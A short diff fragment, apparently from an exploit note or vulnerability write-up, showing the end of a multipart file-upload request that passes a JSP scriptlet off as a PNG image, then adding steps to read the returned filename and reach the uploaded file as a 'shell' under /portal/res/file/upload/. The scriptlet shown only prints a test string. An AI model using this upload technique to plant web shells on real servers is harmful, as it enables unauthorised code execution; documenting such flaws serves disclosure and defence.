@@ -34,3 +34,6 @@ Content-Type: image/png
 <%out.print("test");%>
 --04844569c7ca7d21a3ca115dca477d62--
 ```
+check response to get filename
+
+shell: /portal/res/file/upload/{filename}.jsp
